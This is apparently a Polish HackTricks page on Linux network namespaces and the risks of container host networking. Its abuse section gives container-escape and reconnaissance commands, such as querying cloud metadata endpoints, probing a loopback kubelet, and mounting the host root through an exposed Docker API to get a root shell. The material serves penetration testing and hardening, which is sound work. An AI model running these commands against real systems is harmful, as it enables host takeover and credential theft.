# Przestrzeń nazw sieciowych

{{#include ../../../../../banners/hacktricks-training.md}}

## Omówienie

Przestrzeń nazw sieciowych izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tablice trasowania, stan ARP/sąsiadów, reguły zapory, gniazda oraz zawartość plików takich jak `/proc/net`. Dlatego container może mieć coś, co wygląda jak własne `eth0`, własne lokalne trasy i własne urządzenie loopback bez posiadania rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci to coś znacznie więcej niż port binding. Prywatna przestrzeń nazw sieciowych ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ta przestrzeń nazw jest udostępniona hostowi, container może nagle uzyskać widoczność nasłuchów hosta, usług lokalnych hosta i punktów kontroli sieci, które nigdy nie miały być eksponowane aplikacji.

## Działanie

Świeżo utworzona przestrzeń nazw sieciowych zaczyna z pustym lub prawie pustym środowiskiem sieciowym, dopóki nie zostaną do niej dołączone interfejsy. Container runtimes następnie tworzą lub łączą wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W bridge-based deployments zazwyczaj oznacza to, że container widzi interfejs oparty na veth połączony z host bridge. W Kubernetes pluginy CNI obsługują równoważne ustawienia dla sieciowania Pod.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` to tak drastyczna zmiana. Zamiast otrzymać przygotowany, prywatny stos sieciowy, workload dołącza do rzeczywistego stosu hosta.

## Lab

Możesz zobaczyć niemal pustą przestrzeń nazw sieciowych za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz porównać zwykłe kontenery i kontenery z siecią hosta za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, izolowanego widoku socketów i interfejsów. Sama ta zmiana jest istotna, zanim w ogóle zapytasz, jakie uprawnienia ma proces.

## Użycie w czasie działania

Docker i Podman domyślnie tworzą prywatną przestrzeń nazw sieciowych dla każdego kontenera, chyba że skonfigurowano inaczej. Kubernetes zazwyczaj przydziela każdemu Podowi własną przestrzeń nazw sieciowych, współdzieloną przez kontenery wewnątrz tego Podu, ale odseparowaną od hosta. Incus/LXC również zapewniają rozbudowaną izolację opartą na przestrzeniach nazw sieciowych, często z większą różnorodnością wirtualnych konfiguracji sieciowych.

Zasadnicza zasada jest taka, że prywatna sieć jest domyślną granicą izolacji, podczas gdy host networking jest wyraźnym z niej odstępstwem.

## Błędne konfiguracje

Najważniejszym błędnym ustawieniem jest po prostu współdzielenie przestrzeni nazw sieciowych hosta. Robi się to czasem ze względów wydajnościowych, do niskopoziomowego monitoringu lub wygody, ale usuwa to jedną z najczystszych granic dostępnych dla kontenerów. Nasłuchujące lokalnie na hoście procesy stają się bardziej dostępne, usługi dostępne tylko na localhost mogą stać się osiągalne, a uprawnienia takie jak `CAP_NET_ADMIN` czy `CAP_NET_RAW` stają się dużo bardziej niebezpieczne, ponieważ operacje które umożliwiają są teraz stosowane do środowiska sieciowego samego hosta.

Innym problemem jest nadmierne przyznawanie uprawnień związanych z siecią nawet w przypadku prywatnej przestrzeni nazw sieciowych. Prywatna przestrzeń pomaga, ale nie sprawia, że raw sockets czy zaawansowane mechanizmy kontroli sieci stają się nieszkodliwe.

## Nadużycia

W słabo izolowanych konfiguracjach atakujący mogą przeglądać usługi nasłuchujące na hoście, dotrzeć do punktów zarządzania przywiązanych tylko do loopback, podsłuchiwać lub zakłócać ruch w zależności od konkretnych uprawnień i środowiska, albo rekonfigurować routing i stan firewalla jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to także ułatwić lateral movement oraz rozpoznanie control-plane.

Jeśli podejrzewasz użycie sieci hosta, zacznij od potwierdzenia, że widoczne interfejsy i nasłuchujące procesy należą do hosta, a nie do izolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Usługi dostępne wyłącznie na loopbacku są często pierwszym interesującym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Jeśli dostępne są network capabilities, sprawdź, czy workload może zbadać lub zmodyfikować widoczny stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
W środowiskach klastrowych lub chmurowych host networking również uzasadnia szybkie lokalne recon metadata i control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Pełny przykład: Host Networking + Local Runtime / Dostęp do Kubelet

Host networking nie zapewnia automatycznie uprawnień roota na hoście, ale często ujawnia usługi, które są celowo dostępne tylko z poziomu samego węzła. Jeśli któraś z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią ścieżką eskalacji uprawnień.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Wpływ:

- bezpośrednie przejęcie hosta, jeśli lokalne runtime API jest wystawione bez odpowiedniej ochrony
- rozpoznanie klastra lub lateral movement, jeśli kubelet lub lokalne agenty są osiągalne
- manipulacja ruchem lub denial of service, gdy połączone z `CAP_NET_ADMIN`

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i nasłuchiwacze są widoczne oraz czy widok sieci już przypomina widok hosta zanim w ogóle przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Co jest tutaj interesujące:

- Jeśli identyfikator namespace lub widoczny zestaw interfejsów wygląda jak host, host networking może już być w użyciu.
- `ss -lntup` jest szczególnie wartościowe, ponieważ ujawnia nasłuchy ograniczone do loopback i lokalne endpointy zarządzania.
- Trasy, nazwy interfejsów i kontekst firewalla stają się dużo ważniejsze, jeśli obecne są `CAP_NET_ADMIN` lub `CAP_NET_RAW`.

Podczas przeglądu kontenera zawsze oceniaj namespace sieciowy razem z zestawem uprawnień. Host networking w połączeniu z silnymi network capabilities to zupełnie inna postawa niż bridge networking w połączeniu z wąskim domyślnym zestawem uprawnień.
{{#include ../../../../../banners/hacktricks-training.md}}
